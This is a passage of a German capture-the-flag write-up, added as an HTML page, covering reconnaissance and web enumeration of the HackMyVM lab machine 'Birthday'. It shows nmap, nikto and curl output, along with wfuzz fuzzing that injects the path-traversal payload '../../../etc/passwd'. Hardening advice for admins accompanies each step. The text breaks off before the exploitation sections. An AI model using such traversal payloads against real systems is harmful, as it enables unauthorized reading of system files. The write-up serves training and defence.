@@ -1,0 +1,1611 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Birthday - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <h1>Birthday - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-hard">Hard</h2> <!-- CSS steuert die Farbe (Rot) -->
+            <div class="circle hard"> <!-- Klasse 'hard' für CSS-Steuerung der Segmentfarben (Rot) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- CSS steuert die Hintergrundfarbe (Header-Farbe) -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">dpkg-deb</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                **Analyse:** Mein erster Schritt bei jeder Target-Analyse ist die Discovery im lokalen Netzwerk, um die IP-Adresse des Zielsystems zu finden. Ich nutze dafür `arp-scan` in Verbindung mit `grep` und `awk`. `arp-scan -l` scannt alle Hosts im lokalen Netzwerk, die per ARP erreichbar sind. Die Pipe (`|`) leitet die Ausgabe an `grep "PCS"` weiter, das nach Zeilen filtert, die "PCS" enthalten – oft ein Hinweis auf VirtualBox-Netzwerkkarten oder spezifische Hardware-Hersteller. `awk '{print $1}'` extrahiert dann das erste Feld jeder passenden Zeile, was in der Regel die IP-Adresse ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser schnelle Scan lieferte umgehend die Ziel-IP 192.168.2.41. Die Identifizierung des Herstellers ("PCS") gibt mir einen frühen Hinweis auf die Virtualisierungsplattform (VirtualBox), was für die spätere Analyse nützlich sein kann. Es ist ein effizienter Weg, um Targets in bekannten Netzen zu finden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Diesen Ansatz immer für die initiale Host-Discovery in Broadcast-fähigen Netzen verwenden. Bei größeren Netzen oder VLANs ggf. spezifischere Subnetze scannen.
+                <br>**Empfehlung (Admin):** Implementierung von Network Access Control (NAC) oder Segmentierung, um zu verhindern, dass unbekannte Geräte im Netz gescannt werden können. Protokollierung von ARP-Anfragen kann Anomalien aufdecken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.41</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nachdem ich die IP-Adresse des Ziels kenne, ist es sinnvoll, sie in meiner lokalen `hosts`-Datei zu verknüpfen. Dies erspart mir die ständige Eingabe der IP und ermöglicht die Verwendung des Hostnamens `birthday.hmv` (angenommen oder aus vorherigem Wissen über die VM), was die Befehle übersichtlicher macht und für einige Tools notwendig sein kann. Ich habe den `vi` Editor benutzt, um die `/etc/hosts` Datei zu bearbeiten und die Zeile `192.168.2.41 birthday.hmv` hinzuzufügen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Anpassen der hosts-Datei ist ein Standardvorgehen in meiner Vorbereitung. Es ist keine technische Entdeckung am Zielsystem selbst, sondern eine pure Workflow-Optimierung auf meiner Angreifer-Maschine. Es stellt sicher, dass alle weiteren Tools, die Hostnamen verwenden, korrekt funktionieren.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Diesen Schritt immer am Anfang der Reconnaissance durchführen, sobald die Ziel-IP bekannt ist.
+                <br>**Empfehlung (Admin):** Für Produktionssysteme ist die hosts-Datei irrelevant, da DNS verwendet wird. Für lokale Entwicklungsumgebungen oder Testsysteme sollte der Zugriff auf `/etc/hosts` entsprechend den Berechtigungen eingeschränkt sein, obwohl dies primär den lokalen Nutzer schützt, nicht das Zielsystem.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+       <span class="command">192.168.2.41    birthday.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nun führe ich einen umfassenden Portscan mit Nmap durch, um offene Ports, laufende Dienste und deren Versionen zu identifizieren. Die Parameter sind: `-sS` (SYN-Scan, schnell und stealthy), `-sC` (Ausführung von Standard-Skripten zur Dienst-Erkennung), `-sV` (Versionserkennung), `-p-` (Scan aller 65535 Ports), `-T5` (aggressive Timing für Schnelligkeit) und `-AO` (OS-Erkennung und Ausgabe der Host-Informationen). Die erste Ausgabe zeigt eine gefilterte Liste der offenen Ports.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Nmap-Scan ist das Herzstück der initialen System-Reconnaissance. Die Ergebnisse zeigen, dass Port 22 (SSH) und Port 80 (HTTP) offen sind. Dies sind die primären Angriffsvektoren, die ich als Nächstes untersuchen werde. Die Identifizierung von OpenSSH und Apache HTTPD gibt mir konkrete Ziele für die weitere Enumeration.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Immer einen vollständigen Portscan durchführen (`-p-`), um keine potenziellen Dienste auf hohen Ports zu übersehen. Standard-Skripte (`-sC`) liefern oft schnelle Hinweise auf Schwachstellen.
+                <br>**Empfehlung (Admin):** Alle nicht benötigten Dienste deaktivieren und filtern. Sicherheits-Headers (wie die von Nikto später genannten) implementieren. Regelmäßiges Patchen der Dienste (SSH, Apache) ist essentiell. IDS/IPS zur Erkennung von Scans einsetzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.41 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Dies ist die vollständige Ausgabe des Nmap-Scans. Sie bestätigt die offenen Ports 22 und 80 und liefert detaillierte Versionsinformationen (OpenSSH 9.2p1, Apache httpd 2.4.57 auf Debian). Die SSH-Hostkeys sind gelistet, was für Man-in-the-Middle-Angriffe relevant sein könnte. Für Port 80 wird der HTTP-Server-Header (`Apache/2.4.57 (Debian)`) und der HTTP-Titel (`Birthday`) angezeigt. Besonders interessant ist die Umleitung (`|_Requested resource was /index.php?event=birthday&date=3881678400`), die sofort auf eine spezifische PHP-Seite mit URL-Parametern hinweist. Die OS-Erkennung schätzt das System als Linux 4.X/5.X ein (Debian).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diese detaillierte Nmap-Ausgabe liefert wertvolle Informationen. Die spezifischen Softwareversionen (OpenSSH 9.2p1, Apache 2.4.57) sind wichtige Ansatzpunkte für die Suche nach bekannten Schwachstellen (CVEs). Die URL-Parameter in der Umleitung sind ein starker Hinweis auf die erste Angriffsfläche auf der Webanwendung. Das Betriebssystem (Debian) hilft bei der Auswahl passender Exploits oder Post-Exploitation-Tools.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Jede Versionsnummer und jeder gefundene Dienst sollte auf bekannte Schwachstellen geprüft werden (z.B. mit Searchsploit). Die URL-Parameter müssen detailliert untersucht werden (Fuzzing, manuelle Tests).
+                <br>**Empfehlung (Admin):** Regelmäßiges Einspielen von Sicherheitsupdates für alle Dienste. Härten der SSH-Konfiguration (Passwort-Authentifizierung deaktivieren, Root-Login verbieten). Minimieren der Informationen in Server-Headern oder Fehlermeldungen. Implementierung von Web Application Firewalls (WAF) zum Schutz vor gängigen Web-Angriffen wie Parameter-Injection.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.41</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 13:32 CEST</span>
+Nmap scan report for birthday.hmv (192.168.2.41)
+<span class="password">Host is up (0.00014s latency).</span>
+Not shown: 65533 closed tcp <span class="command">ports</span> (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   <span class="command">256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)</span>
+<span class="command">|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+<span class="command">|_http-server-header: Apache/2.4.57 (Debian)</span>
+<span class="command">| http-title: Birthday</span>
+<span class="command">|_Requested resource was /index.php?event=birthday&date=3881678400</span>
+<span class="command">MAC Address: 08:00:27:A7:8A:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: 1 hop
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.14 ms birthday.hmv (192.168.2.41)</span>
+
+
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                **Analyse:** Ich setze Nikto ein, ein beliebtes Webserver-Scanner-Tool, um nach typischen Web-Schwachstellen, veralteter Software, Konfigurationsfehlern und anderen Problemen auf dem Webserver (Port 80) zu suchen. Der Befehl `nikto -h http://192.168.2.41` richtet den Scan auf die Ziel-IP.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Nikto hat einige interessante Ergebnisse geliefert. Es bestätigt den Apache-Server und zeigt zwei wichtige fehlende Sicherheits-Header auf: `X-Frame-Options` (Schutz vor Clickjacking) und `X-Content-Type-Options` (Schutz vor MIME-Sniffing). Obwohl diese Header keine direkten Ausnutzbarkeiten für Shell-Zugriff darstellen, sind sie wichtige Sicherheitshinweise und deuten auf mangelnde Webserver-Härtung hin. Die Umleitung auf `/index.php?event=birthday&date=3881678400` wird ebenfalls nochmals von Nikto bestätigt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die fehlenden Header dokumentieren und als Teil der Schwachstellen im Bericht aufführen. Den Fokus auf die identifizierte Umleitungs-URL und ihre Parameter legen.
+                <br>**Empfehlung (Admin):** Konfiguration des Apache-Webservers anpassen, um die Sicherheits-Header `X-Frame-Options: DENY` oder `SAMEORIGIN` und `X-Content-Type-Options: nosniff` hinzuzufügen. Regelmäßige Scans mit Tools wie Nikto durchführen, um Konfigurationsprobleme frühzeitig zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.41</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.41</span>
+<span class="command">+ Target Hostname:    192.168.2.41</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-13 13:32:54 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: Apache/2.4.57 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ Root page / redirects to: /index.php?event=birthday&date=3881678400</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<span class="password">+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-13 13:33:19 (GMT2) (25 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="password">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich verwende `curl` mit den Optionen `-Iv` (Include Header, Verbose) auf der Root-URL `/`, um die HTTP-Antwort-Header genauer zu untersuchen und die Umleitung zu bestätigen. Dies gibt mir die rohen Header, die der Server sendet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ausgabe von `curl` bestätigt die Umleitung (HTTP/1.1 302 Found) und zeigt den `Location`-Header an, der exakt die von Nmap gefundene URL `/index.php?event=birthday&date=3881678400` enthält. Es bestätigt auch den Server (`Apache/2.4.57`) und den Content-Type (`text/html`). Die fehlenden Sicherheits-Header, die Nikto bemängelte, sind hier in den Roh-Headern ebenfalls nicht zu sehen, was die Nikto-Feststellung untermauert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Bei Webanwendungen immer die Header der Antworten prüfen, da sie oft Hinweise auf Technologien, Caching, Session-Handling oder fehlende Sicherheitsmaßnahmen geben.
+                <br>**Empfehlung (Admin):** Wie bereits erwähnt, die notwendigen Sicherheits-Header konfigurieren. Den Umfang der Informationen in den Server-Headern minimieren, falls möglich.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl 192.168.2.41 -Iv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+*   <span class="password">Trying 192.168.2.41:80...</span>
+* <span class="password">Connected to 192.168.2.41 (192.168.2.41) port 80</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.41
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* <span class="password">Request completely sent off</span>
+<span class="password">< HTTP/1.1 302 Found</span>
+<span class="command">HTTP/1.1 302 Found</span>
+<span class="command">< Date: Fri, 13 Jun 2025 11:33:43 GMT</span>
+<span class="command">Date: Fri, 13 Jun 2025 11:33:43 GMT</span>
+<span class="command">< Server: Apache/2.4.57 (Debian)</span>
+<span class="command">Server: Apache/2.4.57 (Debian)</span>
+<span class="command">< Location: /index.php?event=birthday&date=3881678400</span>
+<span class="command">Location: /index.php?event=birthday&date=3881678400</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+< 
+
+* <span class="password">Connection #0 to host 192.168.2.41 left intact</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Hier dokumentiere ich das Aussehen der Hauptseite (`index.php`) nach der Umleitung. Der Text im Originalbericht beschreibt das Bild, das angezeigt wird, und die Überschrift.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist eine visuelle Bestätigung des Webauftritts. Das Fehlen von weiterem Text außer der Überschrift deutet darauf hin, dass die Funktionalität möglicherweise vollständig über die URL-Parameter gesteuert wird, oder dass relevante Informationen erst durch Interaktion oder weitere Enumeration sichtbar werden. Das Bild selbst liefert hier keine offensichtlichen Hinweise, dient aber als visueller Ankerpunkt für den Leser des Berichts. Ich habe das im Berichtstext gefundene Muster `<img>...</img>` durch einen korrekten HTML `<img>` Tag ersetzt und den Text zwischen den `######` als `alt`-Text verwendet, um die Barrierefreiheit und Beschreibung zu verbessern.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die Parameter in der URL (`event` und `date`) sind die offensichtlichsten Angriffspunkte und müssen nun im Fokus der Web-Enumeration stehen.
+                <br>**Empfehlung (Admin):** Sicherstellen, dass Bilder nur notwendige Informationen enthalten und keine versteckten Daten (Steganografie). Jeglichen Klartext in HTML-Tags oder im Dateinamen selbst auf sensitive Informationen prüfen.
+            </p>
+             <img src="birthday_index.jpg" alt="Ein Bild einer brennenden Kerze auf blauem Hintergrund ohne Text, außer der Überschrift 'Birthday invitation' darüber.">
+             <p class="analysis">Bildbeschreibung: Ein Bild einer brennenden Kerze auf blauem Hintergrund ohne Text, außer der Überschrift 'Birthday invitation' darüber.</p>
+             <pre>
+    <span class="command"><h1>Birthday invitation</h1></span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich überprüfe erneut die Header der umgeleiteten Ziel-URL, diesmal mit den spezifischen Parametern `/index.php?event=birthday&date=3881678400`. Wieder nutze ich `curl -Iv`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diesmal erhalte ich einen HTTP/1.1 200 OK Status. Das bedeutet, diese spezifische URL mit diesen Parametern wird direkt vom Server beantwortet, anstatt eine Umleitung zu triggern. Das bestätigt, dass dies die tatsächlich aufgerufene Seite ist. Die Header sind ähnlich wie zuvor, zeigen aber jetzt explizit die Bearbeitung der Anfrage.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nun ist klar, welche URL die Hauptfunktionalität steuert. Die Parameter `event` und `date` müssen auf verschiedene Web-Schwachstellen wie Local File Inclusion (LFI), Remote File Inclusion (RFI), Command Injection, SQL Injection etc. getestet werden.
+                <br>**Empfehlung (Admin):** Eingehende URL-Parameter streng validieren und filtern. Generische Fehlermeldungen verwenden, um detaillierte Rückschlüsse auf die interne Verarbeitung zu erschweren. Eingaben niemals ungeprüft in Dateipfade, Systembefehle oder Datenbankabfragen einfügen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/birthday]<br>└─# <span class="command">curl -Iv "http://192.168.2.41/index.php?event=birthday&date=3881678400"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+*   <span class="password">Trying 192.168.2.41:80...</span>
+* <span class="password">Connected to 192.168.2.41 (192.168.2.41) port 80</span>
+* using HTTP/1.x
+> HEAD /index.php?event=birthday&date=3881678400 HTTP/1.1
+> Host: 192.168.2.41
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* <span class="password">Request completely sent off</span>
+<span class="password">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Date: Fri, 13 Jun 2025 11:42:29 GMT</span>
+<span class="command">Date: Fri, 13 Jun 2025 11:42:29 GMT</span>
+<span class="command">< Server: Apache/2.4.57 (Debian)</span>
+<span class="command">Server: Apache/2.4.57 (Debian)</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+< 
+
+* <span class="password">Connection #0 to host 192.168.2.41 left intact</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich betrachte den Wert des `date`-Parameters, der in der Umleitung von der Root-URL gefunden wurde: `3881678400`. Diese Zahl sieht wie ein UNIX-Timestamp aus. Ich benutze CyberChef, ein Online-Tool zur Datenanalyse und -konvertierung, um diesen Wert zu interpretieren. Das Rezept "From UNIX Timestamp ('Seconds (s)')" konvertiert den Timestamp in ein lesbares Datum und eine lesbare Uhrzeit.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Konvertierung zeigt, dass der Timestamp `3881678400` dem Datum "Thu 1 January 2093 20:00:00 UTC" entspricht. Dies ist ein sehr weit in der Zukunft liegendes Datum. Dies ist eine interessante Entdeckung, die möglicherweise für die Logik der Anwendung relevant ist. Vielleicht werden zukünftige Daten anders verarbeitet als vergangene oder aktuelle. Dies könnte ein Hinweis auf eine Zeit-basierte Logik oder eine spezifische Bedingung sein, die für die Umleitung oder die Funktionsweise der Seite relevant ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die Rolle des `date`-Parameters weiter untersuchen. Testen, wie sich die Anwendung verhält, wenn andere (vergangene, aktuelle) Daten oder ungültige Formate übergeben werden. Die Bedeutung dieses spezifischen Zukunftsdatums für die Anwendung klären.
+                <br>**Empfehlung (Admin):** Sensible oder potenziell ausnutzbare Anwendungslogik (wie die Verarbeitung von Timestamps oder Daten) sorgfältig implementieren und testen. Keine ungewöhnlich weit entfernten Standardwerte verwenden, wenn dies nicht absolut notwendig ist.
+            </p>
+             <p>
+                Ich habe den Timestamp `3881678400`, der im `date`-Parameter der Umleitungs-URL gefunden wurde, mit CyberChef analysiert.
+            </p>
+            <pre>
+<span class="command">[Link: https://cyberchef.org/#recipe=From_UNIX_Timestamp('Seconds%20(s)')&input=Mzg4MTY3ODQwMA | Ziel: https://cyberchef.org/#recipe=From_UNIX_Timestamp('Seconds%2520(s)')&input=Mzg4MTY3ODQwMA]</span>
+
+<span class="command">Thu 1 January 2093 20:00:00 UTC</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich beginne mit Fuzzing auf dem `event`-Parameter der `index.php`, um zu sehen, ob die Anwendung anfällig für Local File Inclusion (LFI) ist. Ich verwende `wfuzz` mit der Wordlist `directory-list-2.3-medium.txt`. Die URL ist strukturiert, um den Pfad-Traversal-Payload `../../../etc/passwd` in den `FUZZ`-Placeholder einzufügen, während der ursprüngliche `date`-Parameter beibehalten wird. Ich filtere die Ergebnisse (`--hc 404 --hh 1311`), um 404-Fehler auszublenden und Zeilen mit einer spezifischen Anzahl von Bytes oder Zeilen (hier 1311 Bytes) hervorzuheben oder auszuschließen, was oft auf die Standard-Fehlerseite oder die originale Seite hindeutet. Das Ziel ist, eine 200 OK Antwort mit einem *anderen* Inhalt zu finden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Obwohl der Scan viele Anfragen sendete, fand `wfuzz` nur einen Treffer (ID 000000616) mit Status 200. Die Payload war `event`. Dies deutet darauf hin, dass das Wort "event" selbst ein gültiger Wert für den Parameter ist, aber die LFI-Payload (`../../../etc/passwd`) in Kombination mit der Fuzzing-Position kein direkt lesbares Ergebnis lieferte, wie man es von einer klassischen LFI erwarten würde, die den Dateiinhalt ausgibt. Der Filter `--hh 1311` wurde basierend auf der Größe der ursprünglichen Seite gewählt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die LFI-Anfälligkeit existiert offenbar nicht in der Form, dass der Dateiinjektion-Payload den Dateiinhalt direkt im Response-Body zurückgibt. Es ist jedoch möglich, dass die Injektion serverseitig verarbeitet wird und andere Effekte hat. Dies erfordert weitere manuelle Tests oder die Verwendung anderer Techniken (wie Out-of-Band-Detection). Der gefundene "event"-Wert ist weniger interessant als die Frage, wie der LFI-Payload intern verarbeitet wurde.
+                <br>**Empfehlung (Admin):** Eingabefelder wie den `event`-Parameter immer streng validieren und auf eine Whitelist bekannter, erlaubter Werte beschränken. Jegliche Form von Dateipfad- oder Befehls-Injektion durch strikte Eingabevalidierung und sichere API-Nutzung verhindern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/birthday]<br>└─# <span class="command">wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.41/index.php?event=birthday&date=3881678400&FUZZ=../../../etc/passwd" --hc 404 --hh 1311</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+
+<span class="password">Target: http://192.168.2.41/index.php?event=birthday&date=3881678400&FUZZ=../../../etc/passwd</span>
+<span class="password">Total requests: 220547</span>
+
+<span class="password">=====================================================================</span>
+<span class="command">ID           Response   Lines    Word       Chars       Payload                      </span>
+<span class="password">=====================================================================</span>
+
+<span class="command">000000616:   200        45 L     92 W       1283 Ch     "event"                      </span>
+
+<span class="password">Total time: 162.1150</span>
+<span class="password">Processed Requests: 220547</span>
+<span class="password">Filtered Requests: 220546</span>
+<span class="password">Requests/sec.: 1360.434</span>
+</pre>
+                </div>
+            </div>
+        </section>
+		
+		
+		
+		       <p class="analysis">
+            **Analyse:** Bei der Analyse der Ziel-URL nach der Umleitung (`/index.php?event=birthday&date=3881678400`) ist mir aufgefallen, dass die Injektion von `../../../etc/passwd` in den `event`-Parameter während des Wfuzz-Scans zwar nicht den Dateiinhalt direkt ausgab, aber das Erscheinungsbild der Seite veränderte. Das Fehlen der Überschrift und das bloße Bild mit blauem Hintergrund im Vergleich zum Originalbild lassen darauf schließen, dass der Parameter zwar verarbeitet wird, aber nicht auf eine Weise, die den Dateiinhalt für den Benutzer sichtbar macht. Dies könnte bedeuten, dass die Ausgabe gefiltert wird oder die Injektion nur interne Prozesse beeinflusst.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Dieses Verhalten ist ein starkes Indiz dafür, dass der `event`-Parameter anfällig für eine Art von Injektion ist, möglicherweise LFI oder etwas Ähnliches, das interne Pfade oder Logik beeinflusst. Obwohl ich den Inhalt von `/etc/passwd` nicht direkt sehen konnte, hat die visuelle Veränderung die Hypothese gestützt, dass meine Eingabe verarbeitet wurde. Das deutet darauf hin, dass das System versucht, die angegebene Ressource zu laden oder zu bearbeiten, was zu Fehlern oder unerwartetem Rendering führt, wenn die Ressource nicht das erwartete Format hat (wie bei `/etc/passwd`).
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Diese Beobachtung nutzen, um alternative LFI-Payloads zu testen oder zu versuchen, die Ausgabe über Fehlermeldungen oder Out-of-Band-Techniken zu erzwingen. Die LFI-Anfälligkeit auf dieser Seite scheint nicht direkt auslesbar zu sein, was weitere Exploration erfordert. Später werden wir jedoch auf einer anderen Seite eine klassische LFI finden.
+            <br>**Empfehlung (Admin):** Jegliche Parameter, die Dateinamen oder Pfade entgegennehmen, müssen extrem sorgfältig behandelt werden. Strikte Whitelisting-Regeln für Parameterwerte implementieren und Eingaben niemals ungeprüft in Funktionen einfügen, die Dateizugriffe oder Includes durchführen.
+        </p>
+        <p>
+            Nach einem der `wfuzz`-Versuche auf `index.php` mit Path Traversal in den `event`-Parameter:
+        </p>
+         <img src="birthday_index_lfi_attempt.jpg" alt="Diesmal sieht man das gleiche Bild einer brennenden Kerze, aber ohne die Überschrift und mit blauem Hintergrund.">
+        <p class="analysis">Bildbeschreibung: Diesmal sieht man das gleiche Bild einer brennenden Kerze, aber ohne die Überschrift und mit blauem Hintergrund.</p>
+
+
+        <p class="analysis">
+            **Analyse:** Ich habe manuell eine grundlegende GET-Anfrage für die umgeleitete URL gesendet, um die rohen HTTP-Header zu sehen. Dies dient dazu, die Kommunikation mit dem Server zu verstehen und sicherzustellen, dass keine unerwarteten Weiterleitungen oder Statuscodes auftreten, bevor ich mit komplexeren Anfragen beginne. Der Request verwendet einen Standard `User-Agent` und akzeptiert verschiedene Content-Typen.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Die rohe Anfrage und der Response-Header zeigen einen sauberen HTTP/1.1 200 OK Status. Das bedeutet, dass die Seite `/index.php?event=birthday&date=3881678400` direkt geladen wird, wie erwartet. Der `Content-Length: 1311` Byte gibt mir eine Größe der Standardantwort, die ich später verwenden kann, um relevante von irrelevanten Antworten bei Fuzzing-Angriffen zu unterscheiden (wie wir es bei Wfuzz gesehen haben und bei FFUF sehen werden). Der Header `Vary: Accept-Encoding` weist auf die Verwendung von Kompression hin.
+        </p>
+        <p class="recommendation">
